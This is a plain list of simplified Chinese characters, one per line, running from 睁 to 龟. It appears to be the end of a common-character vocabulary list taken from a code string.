睁
睛
睡
督
睦
睬
睹
瞄
瞎
瞒
瞧
瞪
瞬
瞭
瞳
瞻
矗
矛
矢
知
矩
矫
短
矮
石
矾
矿
码
砂
砌
砍
研
砖
砚
砰
破
砸
砾
础
硅
硕
硝
硫
硬
确
硼
碉
碌
碍
碎
碑
碗
碘
碟
碧
碰
碱
碳
碴
碾
磁
磅
磕
磨
磷
磺
礁
示
礼
社
祈
祖
祝
神
祟
祠
祥
票
祭
祷
祸
禀
禁
福
离
禽
禾
秀
私
秃
秆
秉
秋
种
科
秒
秕
秘
租
秤
秦
秧
秩
秫
积
称
秸
移
秽
稀
程
稍
税
稚
稠
稳
稻
稼
稽
稿
穆
穗
穴
究
穷
空
穿
突
窃
窄
窍
窑
窒
窖
窗
窘
窜
窝
窟
窥
窿
立
竖
站
竞
竟
章
竣
童
竭
端
竹
竿
笆
笋
笑
笔
笙
笛
笤
符
笨
第
笼
等
筋
筏
筐
筑
筒
答
策
筛
筝
筷
筹
签
简
箍
箕
算
管
箩
箫
箭
箱
篇
篓
篙
篡
篮
篱
篷
簇
簸
簿
籍
米
类
籽
粉
粒
粗
粘
粟
粤
粥
粪
粮
粱
粹
精
糊
糕
糖
糙
糜
糟
糠
糯
系
紊
素
索
紧
紫
累
絮
繁
纠
红
纤
约
级
纪
纫
纬
纯
纱
纲
纳
纵
纷
纸
纹
纺
纽
线
练
组
绅
细
织
终
绊
绍
绎
经
绑
绒
结
绕
绘
给
络
绝
绞
统
绢
绣
继
绩
绪
续
绰
绳
维
绵
绷
绸
综
绽
绿
缀
缅
缆
缎
缓
缔
缕
编
缘
缚
缝
缠
缤
缨
缩
缭
缰
缴
缸
缺
罐
网
罕
罗
罚
罢
罩
罪
置
署
羊
美
羔
羞
羡
群
羹
羽
翁
翅
翎
翔
翘
翠
翩
翰
翻
翼
耀
老
考
者
而
耍
耐
耕
耗
耘
耙
耳
耸
耻
耽
耿
聂
聊
聋
职
联
聘
聚
聪
肃
肄
肆
肉
肋
肌
肖
肘
肚
肛
肝
肠
股
肢
肤
肥
肩
肪
肮
肯
育
肴
肺
肾
肿
胀
胁
胃
胆
背
胎
胖
胚
胜
胞
胡
胧
胯
胰
胳
胶
胸
能
脂
脆
脉
脊
脏
脐
脑
脓
脖
脚
脯
脱
脸
脾
腊
腋
腌
腐
腔
腕
腥
腮
腰
腹
腺
腻
腾
腿
膀
膊
膏
膘
膛
膜
膝
膨
膳
臀
臂
臊
臣
自
臭
至
致
臼
舀
舅
舆
舌
舍
舒
舔
舞
舟
航
般
舰
舱
舵
舶
舷
船
艇
艘
良
艰
色
艳
艺
艾
节
芋
芍
芒
芙
芜
芝
芥
芦
芬
芭
芯
花
芳
芹
芽
苇
苍
苏
苔
苗
苛
苞
苟
若
苦
苫
英
苹
茁
茂
范
茄
茅
茉
茎
茧
茫
茬
茴
茵
茶
茸
荆
草
荐
荒
荔
荚
荞
荠
荡
荣
荤
荧
药
荷
荸
莉
莫
莱
莲
获
莹
莺
莽
菇
菊
菌
菜
菠
菩
菱
菲
萄
萌
萍
萎
萝
萤
营
萧
萨
落
著
葛
葡
董
葫
葬
葱
葵
蒂
蒋
蒙
蒜
蒲
蒸
蒿
蓄
蓉
蓖
蓝
蓬
蔑
蔓
蔗
蔚
蔫
蔬
蔼
蔽
蕉
蕊
蕴
蕾
薄
薇
薛
薪
薯
藏
藐
藕
藤
藻
蘑
蘸
虎
虏
虐
虑
虚
虫
虱
虹
虽
虾
蚀
蚁
蚂
蚊
蚌
蚓
蚕
蚜
蚣
蚤
蚪
蚯
蛀
蛆
蛇
蛉
蛋
蛔
蛙
蛛
蛤
蛮
蛹
蛾
蜀
蜂
蜈
蜒
蜓
蜕
蜗
蜘
蜜
蜡
蜻
蝇
蝉
蝌
蝎
蝗
蝙
蝠
蝴
蝶
螃
融
螟
螺
蟀
蟆
蟋
蟹
蠕
蠢
血
衅
行
衍
衔
街
衙
衡
衣
补
表
衩
衫
衬
衰
衷
袁
袄
袋
袍
袒
袖
袜
被
袭
袱
裁
裂
装
裆
裕
裙
裤
裳
裸
裹
褂
褐
褒
褥
褪
襟
西
要
覆
见
观
规
觅
视
览
觉
角
解
触
言
誉
誊
誓
警
譬
计
订
认
讥
讨
让
训
议
讯
记
讲
讳
讶
许
讹
论
讼
讽
设
访
诀
证
评
诅
识
诈
诉
诊
词
译
试
诗
诚
话
诞
诡
询
该
详
诫
诬
语
误
诱
诲
说
诵
请
诸
诺
读
诽
课
谁
调
谅
谆
谈
谊
谋
谍
谎
谐
谒
谓
谚
谜
谢
谣
谤
谦
谨
谬
谭
谱
谴
谷
豁
豆
豌
象
豪
豫
豹
豺
貌
贝
贞
负
贡
财
责
贤
败
账
货
质
贩
贪
贫
贬
购
贮
贯
贰
贱
贴
贵
贷
贸
费
贺
贼
贾
贿
赁
赂
赃
资
赊
赋
赌
赎
赏
赐
赔
赖
赘
赚
赛
赞
赠
赡
赢
赤
赦
赫
走
赴
赵
赶
起
趁
超
越
趋
趟
趣
足
趴
趾
跃
跋
跌
跑
跛
距
跟
跨
跪
路
跳
践
跷
跺
踊
踏
踢
踩
踪
踱
蹂
蹄
蹈
蹋
蹦
蹬
蹭
蹲
躁
躏
身
躬
躯
躲
躺
车
轧
轨
轩
转
轮
软
轰
轴
轻
载
轿
较
辅
辆
辈
辉
辐
辑
输
辕
辖
辙
辛
辜
辞
辟
辣
辨
辩
辫
辰
辱
边
辽
达
迁
迂
迄
迅
过
迈
迎
运
近
返
还
这
进
远
违
连
迟
迫
述
迷
迹
追
退
送
适
逃
逆
选
逊
透
逐
递
途
逗
通
逛
逝
逞
速
造
逢
逮
逸
逻
逼
逾
遂
遇
遍
遏
道
遗
遣
遥
遭
遮
遵
避
邀
邑
邓
邢
那
邦
邪
邮
邻
郁
郊
郎
郑
部
郭
都
鄙
酌
配
酒
酗
酝
酣
酥
酪
酬
酱
酵
酷
酸
酿
醇
醉
醋
醒
采
释
里
重
野
量
金
鉴
针
钉
钓
钙
钝
钞
钟
钠
钢
钥
钦
钧
钩
钮
钱
钳
钻
钾
铁
铃
铅
铆
铐
铛
铜
铝
铡
铣
铭
铲
银
铸
铺
链
销
锁
锄
锅
锈
锉
锋
锌
锐
错
锚
锡
锣
锤
锥
锦
锨
锭
键
锯
锰
锹
锻
镀
镇
镊
镐
镜
镣
镰
镶
长
门
闪
闭
问
闯
闰
闲
间
闷
闸
闹
闺
闻
闽
阀
阁
阅
阎
阐
阔
队
阱
防
阳
阴
阵
阶
阻
阿
附
际
陆
陈
陋
陌
降
限
陕
陡
院
除
陨
险
陪
陵
陶
陷
隅
隆
随
隐
隔
隘
隙
障
隧
隶
难
雀
雁
雄
雅
集
雇
雌
雏
雕
雨
雪
雳
零
雷
雹
雾
需
震
霉
霍
霎
霜
霞
露
霸
霹
青
靖
静
非
靠
靡
面
革
靴
靶
鞋
鞍
鞠
鞭
韧
韩
韭
音
韵
页
顶
顷
项
顺
须
顽
顾
顿
颁
颂
预
颅
领
颇
颈
颊
频
颓
颖
颗
题
颜
额
颠
颤
风
飒
飘
飞
食
餐
饥
饭
饮
饰
饱
饲
饵
饶
饺
饼
饿
馁
馅
馆
馋
馍
馏
馒
首
香
马
驮
驯
驰
驱
驳
驴
驶
驹
驻
驼
驾
骂
骄
骆
骇
验
骏
骑
骗
骚
骡
骤
骨
髓
高
鬓
鬼
魁
魂
魄
魏
魔
鱼
鲁
鲜
鲤
鲫
鲸
鳄
鳍
鳖
鳞
鸟
鸠
鸡
鸣
鸥
鸦
鸭
鸯
鸳
鸵
鸽
鸿
鹃
鹅
鹉
鹊
鹏
鹤
鹦
鹰
鹿
麦
麸
麻
黄
黍
黎
黑
黔
默
鼎
鼓
鼠
鼻
齐
齿
龄
龙
龟



"""